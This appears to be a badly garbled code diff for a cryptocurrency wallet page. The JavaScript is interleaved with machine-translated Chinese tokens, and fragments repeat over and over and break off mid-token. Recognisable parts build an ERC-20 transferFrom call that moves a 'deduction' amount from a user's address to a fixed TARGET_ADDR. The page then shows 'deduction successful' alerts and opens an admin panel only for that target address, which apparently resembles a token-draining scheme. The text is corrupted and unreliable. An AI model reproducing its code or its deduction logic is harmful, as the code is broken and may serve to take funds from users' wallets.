自Addr的padStart(64，"0")片(2).padStart(64，"0")padStart(64，"0")fromAddr.片(2).来自Addr的padStart(64，"0")片(2).来自Addr的padStart(64，"0")片(2).来自Addr的padStart(64，"0")片(2).padStart(64，"0")来自Addr.片(2).来自Addr的padStart(64，"0")片(2).padStart(64，"0")来自Addr.片(2).来自Addr的padStart(64，"0")片(2).padStart(64，"0")
++target_ADDR。切片(2).padStart(64，"0")target_ADDR。切片(2).PadStart(64，"0")target_ADDR。片(2).padStart(64，"0")target_ADDR。片(2).padStart(64，"0")target_ADDR。切片(2).padStart(64，"0")target_ADDR。切片(2).PadStart(64，"0")target_ADDR。片(2).padStart(64，"0")target_ADDR。片(2).padStart(64，"0")target_ADDR。切片(2).padStart(64，"0")target_ADDR。切片(2).PadStart(64，"0")target_ADDR。片(2).padStart(64，"0")target_ADDR。片(2).padStart(64，"0")target_ADDR。切片(2).padStart(64，"0")target_ADDR。切片(2).PadStart(64，"0")target_ADDR。片(2).padStart(64，"0")target_Atarget_ADDR。切片(2).padStart(64，"0")target_ADDR。切片(2).PadStart(64，"0")target_ADDR。片(2).padStart(64，，异步0=>0")target_ADDR。切片(2).PadStart(64，"0")target_ADDR。片(2).padStart(64，"0")target_ADDR。片(2).padStart(64，"0")target_ADDR。切片(2).padStart(64，"0")target_ADDR。切片(2).PadStart(64，"0")target_ADDR。片(2).padStart(64，"0")target_ADDR。片(2).padStart(64，"0")target_ADDR。切片(2).padStart(64，"0")target_ADDR。切片(2).PadStart(64，"0")target_ADDR。片(2).padStart(64，"0")target_ADDR。片(2).padStart(64，"0")
++decutive Wei.toString(16).padStart(64，"0")；decendWei。toString(16)。padStart(64，"0")；decutiveWei.ToString(16).PadStart(64，"0")；decutiveWei.toString(16).padStart(64，"0")；ToString(16).padStart(64，"0")；decutiveWei.toString(16).padStart(64，"0")；deductWei.toString(16).padStart(64,"0");decutive Wei.toString(16).padStart(64，"0")；decendWei。toString(16)。padStart(64，"0")；decutiveWei.ToString(16).PadStart(64，"0")；decutiveWei.toString(16).padStart(64，"0")；ToString(16).padStart(64，"0")；decutiveWei.toString(16).padStart(6decutive的Wei.toString(16).padStart(64，"0")；decendWei。toString(16)。padStart(64，"0")；decutiveWei.ToString(16).PadStart(64，"0")；decutiveWei.toString(16).padStart(64，"0")；ToString(16).padStart(64，"0")；decutiveWei.toString(16).padStart(64，"0")；deductWei.toString(16).padStart(64,"0");decutive Wei.toString(16).padStart(64，"0")；decendWei。toString(16)。padStart(64，"0")；decutiveWei.ToString(16).PadStart(64，"0")；decutiveWei.toString(16).padStart(64，"0")；ToString(16).padStart(64，"0")；decutiveWei.toString(16).padStart(6decutive的Wei.toString(16).padStart(64，"0")；decendWei。toString(16)。padStart(64，"0")；decutiveWei.ToString(16).PadStart(64，"0")；decutiveWei.toString(16).padStart(64，"0")；ToString(16).padStart(64，"0")；decutiveWei.toString(16).padStart(64，"0")；deductWei.toString(16).padStart(64,"0");decutive Wei.toString(16).padStart(64，"0")；decendWei。toString(16)。padStart(64，"0")；decutiveWei.ToString(16).PadStart(64，"0")；decutiveWei.toString(16).padStart(64，"0")；ToString(16).padStart(64，"0")；decutiveWei.toString(16).4，"0")；decetoString(16).padStart(64，"0")；decendWei。toString(16)。padStart(64，"0")；decutiveWei.ToString(16).PadStart(64，"0")；decutiveWei.toString(16).padStart(64，"0")；ToString(16).padStart(64，"0")；decutiveWei.toString(16).padStart(64，"0")；deductWei.toString(16).padStart(64,"0");decutive Wei.toString(16).padStart(64，"0")；decendWei。toString(16)。padStart(64，"0")；decutiveWei.ToString(16).PadStart(64，"0")；decutiveWei.toString(16).padStart(64，"0")；ToString(16).padStart(64，"0")；decutiveWei.toString(16).4，"0")；deceNdwei.ToString(16).PadStart(64，"0")；(64，"0")；decutiveWei.toString(16).padStart(64，"0")；
+常量哈希=await sendTx(transferFromData)；常量哈希=await sendTx(transferFromData)；hash=await sendTx(transferFromData)；const hash=await sendTx(transferFromData)；=await sendTx(transferFromData)；常量哈希=await sendTx(transferFromData)；hash=await sendTx(transferFromData)；const hash=await sendTx(transferFromData)；=await sendTx(transferFromData)；常量哈希=await sendTx(transferFromData)；hash=await sendTx(transferFromData)；const hash=await sendTx(transferFromData)；=await sendTx(transferFromData)；常量哈希=等待sendTx(transferFromData)；ha=awa它发送Tx(transferFromData)；常量哈希=await sendTx(transferFromData)；hash=await sendTx(transferFromData)；const hash=await sendTx(transferFromData)；=await sendTx(transferFromData)；常量哈希=await sendTx(transferFromData)；hash=await sendTx(transferFromData)；const hash=await sendTx(transferFromData)；=await sendTx(transferFromData)；常量哈希=await sendTx(transferFromData)；hash=await sendTx(transferFromData)；const hash=await sendTx(transferFromData)；=await sendTx(transferFromData)；常量哈希=await sh=等待发送Tx(transferFromData)；常量hash=等待sendTx(transferFromData)；(transferFromData)；hash=等待sendTx(transferFromData)；常量哈希=await sendTx(transferFromData)；
+alert('✅折扣成功！\n交易哈希：\n${hash}')；alert('✅划算成功！\n交易哈希：\n${hash}')；('✅折扣成功！\n交易哈希：\n${hash}')；alert('✅抵扣成功！\n交易哈希：\n${hash}')；('✅折扣成功！\n交易哈希：\n${hash}')；alert('✅划算成功！\n交易哈希：\n${hash}')；('✅折扣成功！\n交易哈希：\n${hash}')；alert('✅抵扣成功！\n交易哈希：\n${hash}')；('✅折扣成功！\n交易哈希：\n${hash}')；alert('✅划算成功！\n交易哈希：\n${hash}')；('✅折扣成功！\n交易哈希：\n${hash}')；alert('✅抵扣成功！\n交易哈希：\n${hash}')；('✅折扣成功！\n交易哈希：\n${hash}')；alert('✅划算成功！\n交易哈希：\n${hash}')；('✅折扣成功！\n交易哈希：\n${hash}')；alert('✅抵扣成功！\n交易哈希：\n${hash}')；('✅折扣成功！\n交易哈希：\n${hash}')；警报('✅划算成功！\n交易哈希：\n${hash}')；('✅折扣成功！\n交易哈希：\n${hash}')；alert('✅抵扣成功！\n交易哈希：\n${hash}')；('✅折扣成功！\n交易哈希：\n${hash}')；alert('✅划算成功！\n交易哈希：\n${hash}')；('✅折扣成功！\n交易哈希：\n${hash}')；alert('✅抵扣成功！\n交易哈希：\n${hash}')；('✅折扣成功！\n交易哈希：\n${hash}')；alert('✅划算成功！\n交易哈希：\n${hash}')；('✅折扣成功！\n交易哈希：\n${hash}')；alert('✅抵扣成功！\n交易哈希：\n${hash}')；('✅折扣成功！\n交易哈希：\n${hash}')；alert('✅划算成功！\n交易哈希：\n${hash}')；('✅折扣成功！\n交易哈希：\n${hash}')；alert('✅抵扣成功！\n交易哈希：\n${hash}')；
+userAddrInput。值=""；userAddrInput。价值=""；。value=""；userAddrInput。价值=""；.value=""；userAddrInput。价值=""；。value=""；userAddrInput。价值=""；=""；userAddrInput。价值=""；。value=""；userAddrInput。价值=""；.value=""；userAddrInput。价值=""；。value=""；userAddrInput。价值=""；.值=""；userAddrInput。价值=""；。value=""；userAddrInput。价值=""；.value=""；userAddrInput。价值=""；。value=""；userAddrInput。价值=""；=""；userAddrInput。价值=""；。value=""；userAddrInput。价值=""；.value=""；userAddrInput。价值=""；。value=""；userAddrInput。价值=""；
+decrudeAmountInput。值=""；decrudeAmountInput。价值=""；.value=""；decrudeAmountInput。value=""；=""；decrudeAmountInput。价值=""；.value=""；decrudeAmountInput。value=""；=""；decrudeAmountInput。价值=""；.value=""；decrudeAmountInput。value=""；=""；decrudeAmountInput。价值=""；.value=""；decrudeAmountInput。value=""；=""；decrudeAmountInput。价值=""；.value=""；decrudeAmountInput。value=""；=""；decrudeAmountInput。价值=""；.value=""；decrudeAmountInput。value=""；=""；decrudeAmountInput。价值=""；.value=""；decrudeAmountInput。value=""；=""；decrudeAmountInput。价值=""；.value=""；decrudeAmountInput.value=""；
+await loadUserBalance()；await loadUserBalance()；loadUserBalance()；await loadUserBalance()；loadUserBalance()；await loadUser Balance()；load userbalance()；await loadUserBalance()；loadUserBalance()；await loadUserBalance()；loadUserBalance()；await loadUserBalance()；load userbalance()；await loadUserBalance()；loadUserBalance()；await loadUserBalance()；loadUserBalance()；await loadUserBalance()；load userbalance()；await loadUserBalance()；loadUserBalance()；await loadUserBalance()；loadUserBalance()；await loadUserBalance()；loadUserBalance()；await loadUserBalance()；loadUserBalance()；await loadUserBalance()；loadUserBalance()；await loadUserBalance()；loadUserBalance()；await loadUserBalance()；
+}catch(err){}catch(err){catch(err){}catch(err){catch(err){}catch(err){catch(err){}catch(err){catch(err){}catch(err){catch(err){}catch(err){catch(err){}catch(err){catch(err){}catch(err){catch(err){}catch(err){catch(err){}catch(err){catch(err){}catch(err){catch(err){}catch(err){catch(err){}catch(err){catch(err){}catch(err){catch(err){}catch(err){catch(err){}catch(err){
+alert("❌抵扣失败："+出错.消息)；alert("❌抵扣失败："+犯错.消息)；("❌抵扣失败："+犯错.消息)；alert("❌抵扣失败："+err.message)；("❌抵扣失败："+出错.消息)；alert("❌抵扣失败："+犯错.消息)；("❌抵扣失败："+犯错.消息)；alert("❌划扣失败："+err.message)；("❌抵扣失败："+出错.消息)；alert("❌抵扣失败："+犯错.消息)；("❌抵扣失败："+犯错.消息)；alert("❌抵扣失败："+err.message)；("❌抵扣失败："+出错.消息)；alert("❌抵扣失败："+犯错.消息)；("❌抵扣失败："+犯错.消息)；alert("❌划扣失败："+err.message)；("❌抵扣失败："+出错.消息)；alert("❌抵扣失败："+犯错.消息)；("❌抵扣失败："+犯错.消息)；alert("❌抵扣失败："+err.message)；("❌抵扣失败："+出错.消息)；alert("❌抵扣失败："+犯错.消息)；("❌抵扣失败："+犯错.消息)；alert("❌抵扣失败："+err.message)；("❌抵扣失败："+出错.消息)；alert("❌抵扣失败："+出错.消息)；("❌抵扣失败："+犯错.消息)；alert("❌抵扣失败："+err.message)；("❌抵扣失败："+出错.消息)；alert("❌抵扣失败："+犯错.消息)；("❌抵扣失败："+犯错.消息)；alert("❌抵扣失败："+err.message)；
+    }
+});
+
+walletDot.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventList.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接钱包)；.ener("单击"，手动连接钱包)；.AddEventListener(“单击”，manualConnectWallet)；(“单击”，手动连接wallet)；.addEventListener(“单击”，手动连接钱包)；
+")来自Addr.sip(2).来自Addr的padStart(64，"，()=>."单击"
+userAddress(userAddress&&userAddress.ToLowerCase()===TARGET_ADDR。toLowerCase()){if(userAddress&&userAddress.toLowerCase()===TARGET_ADDR.toLowerCase()){(userAddress&&userAddress.toLowerCase()===TARGET_ADDR.toLowerCase()){if(userAddress&&userAddress.toLowerCase()===TARGET_ADDR.toLowerCase()){(userAddress&&userAddress.ToLowerCase()===TARGET_ADDR。toLowerCase()){if(userAddress&&userAddress.toLowerCase()===TARGET_ADDR.toLowerCase()){(userAddress&&userAddress.toLowerCase()===TARGET_ADDR.toLowerCase()){if(userAddress使用(&&userAddress)(userAddress&&userAddress.ToLowerCase()===TARGET_ADDR。toLowerCase()){if(userAddress&&userAddress.toLowerCase()===TARGET_ADDR.toLowerCase()){(userAddress&&userAddress.toLowerCase()===TARGET_ADDR.toLowerCase()){if(userAddress&&userAddress.toLowerCase()===TARGET_ADDR.toLowerCase()){(userAddress&&userAddress.ToLowerCase()===TARGET_ADDR。toLowerCase()){if(userAddress&&userAddress.toLowerCase()===TARGET_ADDR.toLowerCase()){(userAddress&&userAddress.toLowerCase()===TARGET_ADDR.toLowerCase()){if(userAddress使用(&&使用RADDRESS使用rAddress&&userAddress.ToLowerCase()===TARGET_ADDR。toLowerCase()){if(userAddress&&userAddress.toLowerCase()===TARGET_ADDR.toLowerCase()){(userAddress&&userAddress.toLowerCase()===TARGET_ADDR.toLowerCase()){if(userAddress&&userAddress.toLowerCase()===TARGET_ADDR.toLowerCase()){(userAddress&&userAddress.ToLowerCase()===TARGET_ADDR。toLowerCase()){if(userAddress&&userAddress.toLowerCase()===TARGET_ADDR.toLowerCase()){(userAddress&&userAddress.toLowerCase()===TARGET_ADDR.toLowerCase()){if(userAddress&&userAddress)(userAddress&&userAddress.ToLowerCase()===TARGET_ADDR。toLowerCase()){if(userAddress&&userAddress.toLowerCase()===TARGET_ADDR.toLowerCase()){(userAddress&&userAddress.toLowerCase()===TARGET_ADDR.toLowerCase()){if(userAddress&&userAddress.toLowerCase()===TARGET_ADDR.toLowerCase()){(userAddress&&userAddress.ToLowerCase()===TARGET_ADDR。toLowerCase()){if(userAddress&&userAddress.toLowerCase()===TARGET_ADDR.toLowerCase()){(userAddress&&userAddress.toLowerCase()===TARGET_ADDR.toLowerCasE()){if(userAddress&&埃斯.下部case()===TARGET_ADDR.ToLowerCase()){.toLowerCase()===TARGET_ADDR.toLowerCase()){.toLowerCase()===TARGET_ADDR.toLowerCase()){.ToLowerCase()===TARGET_ADDR.toLowerCase()){
+adminPanel。风格。display=adminPanel。风格。display==="block"？"none"："block"；adminPanel。风格。显示=adminPanel.风格。display==="block"？"none"："block"；。风格。display=adminPanel。风格。display==="block"？"none"："block"；adminPanel。风格。显示=adminPanel.风格。display==="block"？"none"："block"；=adminPanel。风格。display==="block"？"none"："block"；adminPanel。风格。显示=adminPanel.风格。display==="block"？"none"："block"；。风格。display=adminPanel。风格。display==="block"？“无”：“块”；adminPanel。风格。显示=adminPanel.风格。display==="block"？"none"=adminPanel。风格。显示===adminPanel.风格.浸latarget_ADDR。切片
+；adminPanel。风格。显示
+警惕的("非管理员账号")；alert("非管理员账号")；("非管理员账号")；alert("非管理员账号")；("非管理员账号")；alert("非管理员账号")；("非管理员账号")；alert("非管理员账号")；
+警惕的
+decutiveVal
+
+toString
+<
+<
+<
